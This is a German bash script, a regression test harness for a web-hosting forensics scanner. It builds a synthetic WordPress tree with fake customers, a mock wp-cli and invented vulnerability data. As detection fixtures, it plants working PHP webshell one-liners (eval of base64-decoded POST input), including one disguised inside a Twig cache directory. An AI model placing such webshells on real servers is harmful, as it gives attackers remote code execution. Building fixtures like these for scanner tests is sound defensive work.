#!/usr/bin/env bash
# ============================================================
# NT-Forensik — goldmuster.sh
#
#   werkzeuge/goldmuster.sh aufnehmen     Referenzausgabe erzeugen
#   werkzeuge/goldmuster.sh vergleichen   gegen die Referenz pruefen
#   werkzeuge/goldmuster.sh baum          nur den Baum bauen und stehen lassen
#
# ------------------------------------------------------------
# WOZU
#
# Das Werkzeug hat 6.855 Zeilen und keinen einzigen Test. Alle vier Fehler in
# den Nextcloud-Abschnitten am 07.08.2026 fielen erst im Lauf gegen ein echtes
# Kundensystem auf — keiner davon in der Syntaxpruefung. Ein Umbau dieser
# Groessenordnung ohne Rueckfallnetz waere ein Blindflug.
#
# Das Netz ist bewusst grob: es prueft NICHT, ob ein Befund richtig ist. Es
# prueft, ob sich zwischen zwei Programmstaenden etwas geaendert hat, das sich
# nicht aendern sollte. Genau das ist die Frage bei einem Umbau.
#
# ------------------------------------------------------------
# WAS NORMALISIERT WIRD — UND WARUM DAS EHRLICH BLEIBEN MUSS
#
# Jeder Lauf traegt Zeitstempel, Lauf-IDs, Hostnamen und Pruefsummen. Die
# aendern sich immer und muessen vor dem Vergleich raus.
#
# Nicht alles davon laesst sich wegnormalisieren. Die Abschnitte 1, 3, 5, 6, 8,
# 9 und 13b lesen den Live-Systemzustand; wo daraus ein BEFUND wird, hilft nur
# eine Vorgabe. 13b.3 entscheidet ueber laufende Webserver-Prozesse und wird
# deshalb ueber NT_WEBSERVER festgehalten (siehe lauf_ausfuehren) — sonst haengt
# ein kritischer Befund daran, ob auf der Maschine gerade nginx laeuft.
# Vollstaendige Liste und Begruendung: docs/architektur.md. Die Versuchung ist
# gross, bei jeder unerwarteten Abweichung eine weitere Regel zu ergaenzen,
# bis nichts mehr uebrig ist, das abweichen koennte. Deshalb steht jede Regel
# hier einzeln mit Begruendung, und die Zahl der ersetzten Stellen wird
# ausgewiesen: ein Vergleich, der 400 Zeilen wegnormalisiert, ist keiner.
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'; CYN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
ok()   { echo -e "  ${GRN}✅${NC} $1"; }
warn() { echo -e "  ${YLW}⚠️ ${NC} $1"; }
fail() { echo -e "  ${RED}❌${NC} $1"; exit 1; }
info() { echo -e "  ${CYN}·${NC}  $1"; }

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
# Ueberschreibbar, damit eine Sonderprobe ihre Ausgabe woanders ablegen kann,
# ohne die eingecheckte Referenz zu ueberschreiben. Ohne diesen Hebel muesste
# jede Probe, die den Baum absichtlich veraendert, entweder als LETZTER Schritt
# eines Laufs stehen (und braeche still, sobald jemand einen Schritt anhaengt)
# oder die Referenz im Arbeitsbaum zerstoeren.
REF_DIR="${NT_GOLDMUSTER_REF:-${SELF_DIR}/pruefstand/referenz}"
# Bewusst NICHT unter /tmp: Abschnitt 7 sucht dort nach ausfuehrbaren Dateien
# und meldete den Pruefbaum selbst als Befund. Unter macOS faellt das nicht auf,
# weil TMPDIR dort auf /var/folders zeigt — die CI hat es gezeigt. Ein
# Pruefstand, der das Messergebnis veraendert, misst nicht mehr das Werkzeug.
# Fester Name ohne Prozessnummer: config.php des Pruefbaums enthaelt den
# absoluten Pfad, und eine unterschiedlich lange PID aendert damit die
# DATEIGROESSE — 139 gegen 140 Bytes, gemeldet als Abweichung. Der Baum wird
# zu Beginn ohnehin geloescht; parallele Laeufe sind kein Anwendungsfall.
ARBEIT="${NT_GOLDMUSTER_DIR:-${HOME}/.nt-goldmuster}/lauf"
AKTION="${1:-vergleichen}"

# ── Der Schwachstellen-Datenbestand des Pruefstands ──────────
# Ein eigener, winziger Bestand statt des echten unter rezepte/wordpress/daten.
# Zwei Gruende: der echte ist nicht eingecheckt (der Wordfence-Feed verlangt
# einen Schluessel), und ein Pruefstand, dessen Erwartung sich mit jedem
# Datenstand aendert, vergleicht nichts mehr.
#
# ALLE Kennungen und CVE-Nummern hier sind FREI ERFUNDEN. Der Bestand darf
# keine Aussage ueber ein echtes Plugin enthalten.
#
# Der Stand wird bei jedem Bau auf HEUTE gesetzt. Ein fester Stand waere in
# einem Monat aelter als WP_DATEN_MAX_TAGE, das Rezept meldete dann ⚪ statt zu
# vergleichen — und der Pruefstand schlaege ohne jede Codeaenderung aus.
wp_datenbestand_bauen() {
  local D="$1"
  rm -rf "$D"; mkdir -p "${D}/vuln"

  # slug  von  von_inkl  bis  bis_inkl  behoben  cve  cvss  kev  quelle
  cat > "${D}/vuln/wp-plugins.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege, keine Aussage ueber echte Plugins
pruefstand-kev	*	0	2.0	0	2.0	CVE-2026-90001	9.8	ja	https://beispiel.invalid/1
pruefstand-alt	2.0	1	2.4.1	1	2.5	CVE-2026-90002	6.5		https://beispiel.invalid/2
pruefstand-aktuell	1.0	1	3.0	0	3.0	CVE-2026-90003	5.3		https://beispiel.invalid/3
pruefstand-ohne-fix	*	1	*	1		CVE-2026-90007	7.1		https://beispiel.invalid/7
TSV

  cat > "${D}/vuln/wp-core.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege
wordpress	6.0	1	6.4.1	1	6.4.2	CVE-2026-90004	7.5		https://beispiel.invalid/4
TSV

  # Nicht leer lassen: eine leere Tabelle heisst fuer den Vergleicher "kein
  # Datenbestand fuer diesen Typ", und dann faellt JEDES Theme in ⚪ — auch bei
  # Kunde 3, der die Gegenprobe ist. Mit einem Eintrag wird stattdessen der
  # Theme-Trefferpfad mitgeprueft.
  cat > "${D}/vuln/wp-themes.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege
pruefstand-thema	*	0	1.0	0	1.0	CVE-2026-90005	4.3		https://beispiel.invalid/5
TSV
  # Composer-Advisories im OSV-Format (#14). Bewusst als JSON und nicht als
  # TSV: die GitHub Advisory Database liefert genau dieses Format, und der
  # Vergleicher liest es direkt. Eine Zwischenstufe waere eine weitere Stelle,
  # an der sich ein Fehler versteckt.
  # NT_PRUEFSTAND_OHNE_COMPOSER=1 laesst den Composer-Bestand weg. Ohne
  # Bestand erhebt das Rezept die Abhaengigkeiten gar nicht erst (siehe
  # _wp_composer_bestand) — der Befund faellt weg, und der Vergleich MUSS das
  # bemerken.
  if [[ "${NT_PRUEFSTAND_OHNE_COMPOSER:-0}" != "1" ]]; then
  mkdir -p "${D}/vuln/composer"
  cat > "${D}/vuln/composer/GHSA-pruefstand-0001.json" <<'JSON'
{
  "id": "GHSA-pruefstand-0001",
  "aliases": ["CVE-2026-90006"],
  "severity": [{"type": "CVSS_V3", "score": "8.1"}],
  "affected": [{
    "package": {"ecosystem": "Packagist", "name": "pruefstand/bibliothek"},
    "ranges": [{"type": "ECOSYSTEM", "events": [
      {"introduced": "1.0.0"},
      {"fixed": "1.4.0"}
    ]}]
  }]
}
JSON
  fi
  printf '%s | Pruefstand-Bestand, bei jedem Bau neu erzeugt\n' "$(date -u +%Y-%m-%d)" \
    > "${D}/VERSION"
}

# ── wp-cli-Attrappe und lokale Plugin-Pruefsummen ────────────
# Ohne ein 'wp' im PATH bricht der Rahmen nach der Werkzeug-Probe ab, und
# rezept_kern laeuft nie. Die Kern-Integritaet und die Plugin-Pruefsummen waren
# damit vom Pruefstand nicht erreichbar — beides Pruefungen, die im Vorfall
# zaehlen.
#
# Die Attrappe ist bewusst dumm: sie beantwortet genau die zwei Fragen, die das
# Rezept stellt, und leitet ihre Antwort aus dem Pfad ab. Sie bildet wp-cli
# NICHT nach. Was sie prueft, ist der Weg durch das Rezept — nicht, ob wp-cli
# funktioniert.
attrappe_bauen() {
  local B="$1"
  rm -rf "$B"; mkdir -p "$B"
  # NT_PRUEFSTAND_OHNE_WPCLI=1 laesst die Attrappe weg. Der Rahmen findet dann
  # kein 'wp', meldet die Instanz als "nur dateibasiert geprueft" und
  # ueberspringt rezept_kern.
  #
  # Das ist der Nachweis fuer #10: die Plugin-Pruefsummen brauchen wp-cli
  # nicht (sie lesen Dateien und vergleichen mit python3), lagen bis v3.11
  # aber in rezept_kern und fielen deshalb mit weg. Der zugehoerige
  # CI-Schritt prueft, dass die Pruefsummen-Aussage in diesem Lauf TROTZDEM
  # in der Konsole steht — eine Behauptung ueber Anwesenheit, nicht ueber
  # Gleichheit, weil ein Referenzvergleich hier nur zeigen wuerde, dass sich
  # ueberhaupt etwas geaendert hat.
  if [[ "${NT_PRUEFSTAND_OHNE_WPCLI:-0}" == "1" ]]; then
    return 0
  fi
  # PHP, nicht bash: der Rahmen ruft das Werkzeug als `php <datei> …` auf, weil
  # echtes wp-cli ein PHP-Programm ist. Eine Bash-Attrappe wuerde von PHP
  # gelesen und ihr eigener Quelltext landete als Antwort im Bericht — genau so
  # ist es beim ersten Versuch passiert.
  cat > "${B}/wp" <<'WPCLI'
<?php
# Pruefstand-Attrappe fuer wp-cli. Kein Ersatz, nur eine Antwort auf zwei
# Fragen. Der Pfad entscheidet: kunde-zwei ist der Vorfall, alles andere sauber.
$pfad = '';
foreach ($argv as $a) {
    if (strpos($a, '--path=') === 0) { $pfad = substr($a, 7); }
}
$befehl = ($argv[1] ?? '') . ' ' . ($argv[2] ?? '');
if ($befehl === 'core version') {
    # DIESE ATTRAPPE HAT EINEN FEHLER VERDECKT.
    #
    # Bis v3.14 stand hier: "Die Probe laeuft OHNE --path, deshalb hier ein
    # fester Wert." Der Defekt war also beim Bau der Attrappe BEMERKT — und
    # umgangen statt behoben. Echtes wp-cli kann ohne --path nicht antworten;
    # die Probe scheiterte auf jeder echten Installation, und mit ihr fielen
    # Kern-, Konfigurations- und Datenbankpruefung aus.
    #
    # Deshalb verhaelt sich die Attrappe jetzt wie das Original: ohne --path
    # keine Antwort. Faellt der Pfad wieder weg, schlaegt der Pruefbaum aus.
    if ($pfad === '') {
        fwrite(STDERR, "Error: This does not seem to be a WordPress installation.\n"
                     . "Pass --path=`path/to/wordpress` or run `wp core download`.\n");
        exit(1);
    }
    echo (strpos($pfad, 'kunde-drei') !== false ? "6.9.2" : "6.4.1"), "\n";
    exit(0);
}
# ── Datenbankabfragen ────────────────────────────────────────────────
# rezept_sql versucht zuerst mysql und faellt dann auf `wp db query` zurueck.
# Im Pruefbaum gibt es keine Datenbank, also landet jede Abfrage hier.
#
# Bis v3.14 antwortete die Attrappe darauf mit exit(0) und KEINER Ausgabe.
# Damit fand der Pruefbaum nie einen Angreifer-Admin — und der ganze Weg von
# der Erkennung ueber findings.json bis zur Bereinigung war ungeprueft. Genau
# deshalb blieb unbemerkt, dass actionable.rogue_wp_admins den
# Installationspfad verliert und die Bereinigung damit nicht handeln kann.
if ($befehl === 'db query') {
    # Das SQL steht NICHT an fester Stelle: rezept_sql ruft
    # `wp db query --skip-column-names "<sql>"`, der Schalter schiebt es auf
    # argv[4]. Deshalb alle Argumente zusammenfassen statt zu indizieren.
    $sql = implode(' ', array_slice($argv, 3));
    # a) kuerzlich angelegte Administratoren — belegt, nicht Verdacht.
    #    Nur bei Kunde 2; Kunde 3 ist die Gegenprobe und muss leer bleiben.
    if (strpos($sql, 'user_registered >') !== false) {
        if (strpos($pfad, 'kunde-zwei') !== false) {
            # Vierte Spalte `aeltere`: wie viele Benutzer VOR diesem angelegt
            # wurden. 0 heisst: dieses Konto hat die Installation eroeffnet.
            #
            # DREI Zeilen, und nur zusammen pruefen sie etwas. Eine Regel, die
            # den Gruender verschont, aber auch die beiden Eindringlinge,
            # waere durch "meldet nie" zu bestehen.
            #
            # NT_PRUEFSTAND_OHNE_GRUENDERGUARD=1 gibt dem Gruender einen
            # aelteren Benutzer — dann MUSS er in die Quarantaeneliste
            # rutschen, und der Vergleich muss das bemerken.
            $g = getenv('NT_PRUEFSTAND_OHNE_GRUENDERGUARD') === '1' ? '3' : '0';
            echo "gruender\tinfo@beispiel.invalid\t2026-08-10 09:58:51\t{$g}\n";
            echo "wp_backup\tadmin@beispiel.invalid\t2026-08-11 03:14:07\t5\n";
            echo "svc_updater\tsvc@beispiel.invalid\t2026-08-11 03:14:09\t5\n";
        }
        exit(0);
    }
    # Alter der Installation — Beleg fuer die Gruender-Einordnung.
    if (strpos($sql, 'MIN(post_date)') !== false) {
        if (strpos($pfad, 'kunde-zwei') !== false) { echo "2026-08-10 11:58:51\n"; }
        exit(0);
    }
    # b) angreifertypischer Name oder Adresse — Verdacht, kein Beleg.
    #    Die Bereinigung darf diese Konten nie deaktivieren, nur notieren.
    if (strpos($sql, 'REGEXP') !== false) {
        if (strpos($pfad, 'kunde-zwei') !== false) {
            echo "wpadmin\talt@beispiel.invalid\n";
        }
        exit(0);
    }
    exit(0);
}
if ($befehl === 'core verify-checksums') {
    // Kunde 4: KEINE Ausgabe, Rueckgabewert 1. Der Fall, der auf
    // kundenserver42 12 von 121 Instanzen betraf — wp-cli bricht ab, ohne
    // etwas zu sagen. Weder "Success:" noch "Error:", nur Stille.
    // Bis zum 14.08.2026 fiel das in den else-Zweig und ergab die Zeile
    // "WordPress-Core unveraendert". Muss ⚪ sein, nicht ✅.
    if (strpos($pfad, 'kunde-vier') !== false) {
        exit(1);
    }
    if (strpos($pfad, 'kunde-zwei') !== false) {
        echo "Warning: File doesn't verify against checksum: wp-includes/load.php\n";
        echo "Warning: File should not exist: wp-admin/mu.php\n";
        exit(1);
    }
    echo "Success: WordPress installation verifies against checksums.\n";
    exit(0);
}
exit(0);
WPCLI
  chmod +x "${B}/wp"
}

# Die Pruefsummen, gegen die _wp_plugin_integritaet vergleicht. Erzeugt aus den
# Dateien im Baum — mit genau einer gewollten Abweichung, damit der
# Trefferpfad geuebt wird und nicht nur der Gutfall.
# ── Vorgefertigte yara-Ausgabe fuer Abschnitt 13c ────────────
# Der Pruefbaum hat weder yara noch den fremden Regelsatz (LGPL, wird nicht
# mitgeliefert). Ohne diese Naht waere 13c vom Pruefstand ueberhaupt nicht
# erreichbar — und ein Filter, dessen Wirkung nie gemessen wird, ist eine
# Behauptung.
#
# Die Verteilung bildet den Messlauf aus #18 nach: viel Rauschen auf
# Bibliotheksdateien bekannter Plugins, der eigentliche Schadcode weiter
# unten. Nach dem Pruefsummenfilter muss er nach OBEN rutschen.
#
# Bewusst mit dabei:
#   wp-includes/load.php   steht in CORE_INJECTED (die Attrappe meldet es als
#                          "doesn't verify") und darf deshalb NICHT gefiltert
#                          werden, obwohl es unter wp-includes/ liegt.
#   pruefstand-aktuell     traegt eine verfaelschte Pruefsumme und bleibt
#                          ebenfalls stehen.
pmf_attrappe_bauen() {   # <zieldatei> <baum>
  local Z="$1" W="$2"
  local k2="${W}/kunde-zwei.example/httpdocs"
  : > "$Z"
  local datei regel n
  # Rauschen: bestaetigt unveraenderte Bibliotheksdateien, je 4 Regeln.
  for datei in "${k2}/wp-content/plugins/pruefstand-alt/lib/"{a,b,c,d,e}.php \
               "${k2}/wp-content/plugins/pruefstand-kev/lib/"{a,b,c}.php; do
    [[ -f "$datei" ]] || continue
    for regel in ObfuscatedPhp DodgyStrings SuspiciousEncoding HexEncoding; do
      printf '%s %s\n' "$regel" "$datei" >> "$Z"
    done
  done
  # Kern: bestaetigt unveraendert, 4 Regeln.
  [[ -f "${k2}/wp-includes/version.php" ]] && \
    for regel in ObfuscatedPhp DodgyStrings SuspiciousEncoding HexEncoding; do
      printf '%s %s\n' "$regel" "${k2}/wp-includes/version.php" >> "$Z"
    done
  # Kern-ABWEICHUNG: muss stehenbleiben.
  printf 'ObfuscatedPhp %s\nDodgyStrings %s\nHexEncoding %s\n' \
    "${k2}/wp-includes/load.php" "${k2}/wp-includes/load.php" "${k2}/wp-includes/load.php" >> "$Z"
  # Veraendertes Plugin: muss stehenbleiben.
  printf 'ObfuscatedPhp %s\nDodgyStrings %s\n' \
    "${k2}/wp-content/plugins/pruefstand-aktuell/pruefstand-aktuell.php" \
    "${k2}/wp-content/plugins/pruefstand-aktuell/pruefstand-aktuell.php" >> "$Z"
  # Der eigentliche Schadcode. Drei Regeln — im Messlauf reichte das fuer
  # Platz 11. Nach dem Filter muss er unter den ersten fuenf stehen.
  for datei in "${k2}/wp-content/uploads/2026/03/bild.php" \
               "${k2}/wp-content/uploads/2026/03/hilfe.php"; do
    [[ -f "$datei" ]] || continue
    for regel in ObfuscatedPhp DodgyStrings SuspiciousEncoding; do
      printf '%s %s\n' "$regel" "$datei" >> "$Z"
    done
  done
}

# ── Vorgefertigter Wordfence-Bestand fuer #17 ────────────────
# Der Pruefbaum hat keine Datenbank, und der Wordfence-Zweig liest
# ausschliesslich aus ihr. Ohne diese Naht waere er von keinem Vergleich
# gedeckt — und genau bei der Auswertung des ECHTEN Bestands ist eine
# Verwechslung passiert: ein als "Modified plugin file" gemeldeter Treffer war
# legitimer Plugin-Code. Je Befundart deshalb mindestens eine Zeile, damit die
# Zuordnung nicht verrutscht.
#
# lastScanCompleted bewusst als fester, alter Zeitstempel: der Befund
# "Scan ist N Tage alt" soll geuebt werden, und ein relativer Wert waere von
# Lauf zu Lauf anders. Die Normalisierung faengt die Zahl im Text ab.
wordfence_attrappe_bauen() {   # <zielverzeichnis>
  local Z="$1"
  rm -rf "$Z"; mkdir -p "$Z"
  # Nur EINE Installation traegt Wordfence. Auf einem echten Server mit 68
  # Instanzen hatten 5 die Tabellen — 7 %. Ein Pruefbaum, in dem jede
  # Installation Wordfence hat, wuerde den haeufigsten Fall nie ueben.
  printf '%s' "kunde-zwei.example/httpdocs" > "${Z}/nur"
  printf '%s\n' "wp_wfconfig" > "${Z}/tabellen.tsv"
  {
    printf 'keyType\tfree\n'
    printf 'lastScanCompleted\t1700000000\n'
    printf 'scansEnabled_malware\t1\n'
  } > "${Z}/konfig.tsv"
  {
    printf 'wfPluginVulnerable\tThe Plugin "pruefstand-kev" has a known security vulnerability\n'
    printf 'wfThemeVulnerable\tThe Theme "pruefstand-thema" has a known security vulnerability\n'
    # DER Befund: der Kunde hat einen Scanner, aber er sieht diese Pfade nicht an.
    printf 'skippedPaths\tScan skipped 99 paths outside the WordPress installation\n'
    # Integritaetsabweichung, KEIN Signaturtreffer.
    printf 'knownfile\tModified plugin file: wp-content/plugins/pruefstand-aktuell/pruefstand-aktuell.php\n'
    printf 'wfPluginAbandoned\tThe Plugin "pruefstand-alt" is no longer maintained\n'
  } > "${Z}/issues.tsv"
}

db_attrappe_bauen() {   # <zielverzeichnis>
  local Z="$1"
  rm -rf "$Z"; mkdir -p "$Z"
  # Wie die Wordfence-Attrappe: nur EINE Installation, damit der haeufigste
  # Fall — kein Befund — auf den anderen geuebt bleibt.
  printf '%s' "kunde-zwei.example/httpdocs" > "${Z}/nur"

  # e1: zwei Eintraege. pruefstand-kev/pruefstand-kev.php LIEGT im Baum —
  # dieser Eintrag darf keinen Befund erzeugen; er ist die eigentliche Probe.
  # doorway-gen/loader.php liegt nirgends: der Anlassfall, Leiche oder Tarnung.
  # NT_PRUEFSTAND_OHNE_DBPROBE=1 liefert stattdessen eine saubere Liste und
  # eine leere Optionstabelle — der Vergleich MUSS das bemerken.
  if [[ "${NT_PRUEFSTAND_OHNE_DBPROBE:-0}" != "1" ]]; then
    printf 'a:2:{i:0;s:31:"pruefstand-kev/pruefstand-kev.php";i:1;s:22:"doorway-gen/loader.php";}\n' \
      > "${Z}/aktive_plugins.tsv"
    # e2: vier Spalten (Name, getroffenes Muster, Laenge, Fenster um den
    # Treffer). Der zweite Eintrag ist der auf dem echten Server gemessene
    # FEHLALARM — simplehooks-settings ist ein Plugin, dessen Zweck das
    # Ablegen von PHP-Schnipseln ist. Er gehoert in die Fixture, damit
    # niemand die Regel wieder auf `crit` hebt, ohne ihn zu sehen.
    {
      printf 'widget_custom_html\t<?php\t118\t…function(){ include ABSPATH."wp-content/uploads/.q"; }\n'
      printf 'simplehooks-settings\t<?php\t9184\ta:57:{s:7:"wp_head";…<?php echo do_shortcode("[x]"); ?>…\n'
    } > "${Z}/optionen_php.tsv"
    # e3: die Wortliste der Kampagne, weit ueber der Schwelle. Dazu eine
    # legitime grosse Option — die Rangfolge muss beide zeigen, denn sie ist
    # ausdruecklich KEIN Befund, sondern Material fuer die Sichtung.
    {
      printf 'doorway_terms_cache\t1834219\n'
      printf '_transient_dirsize_cache\t412008\n'
    } > "${Z}/optionen_gross.tsv"
  else
    printf 'a:1:{i:0;s:31:"pruefstand-kev/pruefstand-kev.php";}\n' \
      > "${Z}/aktive_plugins.tsv"
  fi
}

pruefsummen_bauen() {   # <zielverzeichnis> <baum>
  local P="$1" W="$2"
  rm -rf "$P"; mkdir -p "$P"
  python3 - "$P" "$W" <<'PY'
import hashlib, json, os, sys
ziel, baum = sys.argv[1], sys.argv[2]

# Fuer jedes Plugin im Baum ein Pruefsummensatz — ausser 'pruefstand-aktuell'
# bei Kunde 2: dort wird der Satz absichtlich mit einer falschen Pruefsumme
# fuer die PHP-Datei erzeugt. Das ist der einzige erwartete 🔴 aus dieser
# Pruefung. 'pruefstand-kopflos' bekommt keinen Satz (keine Fassung) und
# 'pruefstand-alt' bei Kunde 3 ebenfalls nicht — das ist der ⚪-Fall
# "kein Pruefsummensatz", den es auf jeder echten Seite gibt.
ohne_satz = {("kunde-drei.example", "pruefstand-alt")}
verfaelscht = {("kunde-zwei.example", "pruefstand-aktuell")}
# Die beiden Lagen aus #40, beide bei pruefstand-kev auf Kunde 2:
#   SOFT  — readme.txt liegt im Baum, der Satz traegt eine andere Pruefsumme.
#           Keine Code-Endung, also Einstufung SOFT statt MOD.
#   FEHLT — der Satz fuehrt eine Sprachdatei, die auf der Platte nicht liegt.
#           Auf dem echten System waren es zwei solche Dateien (#9,
#           Messpunkt 3), und der Bericht nannte nur die Zahl.
soft_daneben = {("kunde-zwei.example", "pruefstand-kev"): "readme.txt"}
phantom      = {("kunde-zwei.example", "pruefstand-kev"):
                "languages/pruefstand-kev-de_DE.mo"}

for kunde in sorted(os.listdir(baum)):
    pdir = os.path.join(baum, kunde, "httpdocs", "wp-content", "plugins")
    if not os.path.isdir(pdir):
        continue
    for slug in sorted(os.listdir(pdir)):
        voll = os.path.join(pdir, slug)
        if not os.path.isdir(voll):
            continue
        haupt = os.path.join(voll, slug + ".php")
        if not os.path.isfile(haupt):
            continue
        fassung = ""
        for zeile in open(haupt, encoding="utf-8", errors="replace"):
            if zeile.strip().lower().startswith("version:"):
                fassung = zeile.split(":", 1)[1].strip()
        if not fassung or (kunde, slug) in ohne_satz:
            continue
        dateien = {}
        for wurzel, _d, namen in os.walk(voll):
            for n in namen:
                p = os.path.join(wurzel, n)
                roh = open(p, "rb").read()
                rel = os.path.relpath(p, voll)
                if (kunde, slug) in verfaelscht and rel.endswith(".php"):
                    roh = roh + b"# abweichend"      # erzwungene Abweichung
                if soft_daneben.get((kunde, slug)) == rel:
                    roh = roh + b"# andere fassung"  # SOFT: Nicht-Code weicht ab
                dateien[rel] = {"md5": hashlib.md5(roh).hexdigest(),
                                "sha256": hashlib.sha256(roh).hexdigest()}
        if (kunde, slug) in phantom:
            # FEHLT: im Satz gefuehrt, auf der Platte nicht vorhanden.
            dateien[phantom[(kunde, slug)]] = {"md5": "0" * 32,
                                               "sha256": "0" * 64}
        d = os.path.join(ziel, slug)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, fassung + ".json"), "w", encoding="utf-8") as fh:
            json.dump({"plugin": slug, "version": fassung, "files": dateien}, fh)
PY
}

# ── Der synthetische Baum ────────────────────────────────────
# Drei Kunden. Kunde 2 traegt gepflanzten Schadcode, Kunde 3 ist sauber und
# dient als Gegenprobe: was bei ihm gemeldet wird, ist ein Falsch-Positiv.
# Jeder Kunde hat zusaetzlich eine Sicherungskopie — der Fall, an dem sich am
# 07.08. drei vermeintliche Nextcloud-Instanzen als Kopien derselben
# herausstellten.
baum_bauen() {
  local W="$1"
  rm -rf "$W"; mkdir -p "$W"

  # ── Kunde 1: WordPress, sauber ──────────────────────────────
  local k1="${W}/kunde-eins.example/httpdocs"
  mkdir -p "${k1}/wp-content/uploads" "${k1}/wp-admin" "${k1}/wp-includes"
  cat > "${k1}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k1_wp');
define('DB_USER', 'k1_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP
  printf '<?php\n// harmlos\n' > "${k1}/index.php"
  printf '<?php\n// wp-load\n' > "${k1}/wp-load.php"

  # ── Kunde 2: WordPress mit Schadcode + Joomla + Nextcloud ───
  local k2="${W}/kunde-zwei.example/httpdocs"
  mkdir -p "${k2}/wp-content/uploads/2026/03" "${k2}/wp-content/mu-plugins"
  cat > "${k2}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k2_wp');
define('DB_USER', 'k2_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP
  printf '<?php\n// wp-load\n' > "${k2}/wp-load.php"
  # Webshell im Uploads-Verzeichnis — PHP gehoert dort nie hin.
  printf '<?php eval(base64_decode($_POST["c"])); ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/bild.php"

  # ── Erzeugter Code bekannten Formats (7.2, Sichtungsstufe) ──────────
  # Drei Erzeuger, gemessen am 14.08.2026 auf 282 Treffern: WPML-Twig-Cache
  # (162), TCPDF-Schriftmetriken (66), Datenablage hinter __halt_compiler()
  # (8). Zusammen 236 — sie duerfen nicht in die Quarantaene, aber auch nicht
  # aus dem Bericht.
  #
  # Die vierte Datei ist die GEGENPROBE und der eigentliche Test: eine Shell,
  # die im WPML-Cache-Verzeichnis LIEGT, aber nicht wie ein Twig-Template
  # AUSSIEHT. Sie muss Quarantaene-Kandidat bleiben. Eine Pfadregel
  # (*/uploads/cache/wpml/*) haette sie verschwinden lassen — genau deshalb
  # prueft 7.2 den Inhalt und nicht den Ort.
  #
  # Die TCPDF-Datei traegt bewusst die Schreibweise MIT Leerzeichen
  # ($type = 'cidfont0'). Die erste Fassung der Regel kannte nur die ohne und
  # liess 4 von 66 Dateien stehen.
  mkdir -p "${k2}/wp-content/uploads/cache/wpml/twig/3e" \
           "${k2}/wp-content/uploads/wcj_uploads/tcpdf_fonts" \
           "${k2}/wp-content/uploads/aios/firewall-rules"
  #
  # GROESSE IST TEIL DER FIXTURE. Der erste Entwurf schrieb 145-Byte-Dateien —
  # die fielen in die Waechterregel darueber (unter 200 Byte, erste Zeile nur
  # "<?php") und erreichten die Abschichtung nie. Der Prüfstand war gruen und
  # hat nichts geprueft. Echte Twig-Caches sind 3–10 KB, Schriftmetriken 1–5 KB.
  {
    printf '<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\n'
    printf 'use \\WPML\\Core\\Twig\\Error\\LoaderError;\nuse \\WPML\\Core\\Twig\\Markup;\n\n'
    printf 'class __TwigTemplate_pruefstand extends Environment\n{\n'
    for i in $(seq 1 40); do
      printf '    protected function block_%02d($context, array $blocks = array()) { echo "%02d"; }\n' "$i" "$i"
    done
    printf '}\n'
  } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/3e63fcbd19fd358f040b36a0ac02099.php"
  {
    printf "<?php\n\$type = 'cidfont0';\n\$name = 'STSongStd-Light-Acro';\n"
    printf "\$displayname = 'STSong Light (Simp. Chinese)';\n"
    printf "\$desc = array('Ascent' => 752, 'Descent' => -271, 'CapHeight' => 737);\n"
    printf "\$cw = array(\n"
    for i in $(seq 1 40); do printf "  %d => 500,\n" "$i"; done
    printf ");\n"
  } > "${k2}/wp-content/uploads/wcj_uploads/tcpdf_fonts/stsongstdlight.php"
  {
    printf '<?php __halt_compiler();\n'
    printf '/**\n * This file was created by All In One Security (AIOS) plugin.\n'
    printf ' * The file is required for storing and retrieving your settings.\n */\n'
    printf '{"aios_pruefstand":true,"rules":['
    for i in $(seq 1 20); do printf '{"id":%d,"on":true},' "$i"; done
    printf '{"id":99,"on":false}]}\n'
  } > "${k2}/wp-content/uploads/aios/firewall-rules/settings.php"
  # BEIDE FASSUNGEN MUESSEN UEBER DIE WAECHTERSCHWELLE (200 Byte).
  #
  # Der erste Entwurf schrieb 43 bzw. 96 Byte. Unter dem Schalter fiel die
  # Datei damit in die Waechterregel (klein UND erste Zeile nur "<?php") und
  # erreichte die Abschichtung nie: der GUARD_COUNT stieg von 6 auf 7, die
  # Sichtungsliste blieb bei 3. Die Gegenprobe belegte damit den
  # Waechterfilter statt der Abschichtung — grün, und ohne Aussage.
  _fuell() { local i; for i in $(seq 1 14); do
    printf '// Fuellzeile %02d — die Datei muss ueber der Waechterschwelle liegen\n' "$i"; done; }
  if [[ "${NT_PRUEFSTAND_OHNE_ERZEUGERFILTER:-0}" != "1" ]]; then
    # Shell IM Cache-Verzeichnis, aber OHNE dessen Format: bleibt Kandidat.
    { printf '<?php // Pruefstand: liegt im Twig-Cache, traegt dessen Format nicht\n'
      _fuell
      printf 'eval(base64_decode($_POST["w"]));\n'
    } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/getarnt.php"
  else
    # Mit Schalter traegt sie den Twig-Kopf: die Abschichtung MUSS sie dann
    # aufnehmen — und der Vergleich muss das bemerken.
    { printf '<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\n'
      _fuell
      printf 'eval(base64_decode($_POST["w"]));\n'
    } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/getarnt.php"
  fi

  # Waechter-Dateien: legitim, duerfen NICHT als Fund erscheinen.
  #
  # Ein Messlauf ueber 68 Installationen meldete 274 leere index.php als
  # "extrem verdaechtig". Der Grund war eine Luecke in der Reihenfolge: der
  # Waechter-Test verlangte eine kleine Datei UND einen Inhaltstreffer — eine
  # leere Datei liefert keinen Treffer und rutschte durch. Ein Bericht, der
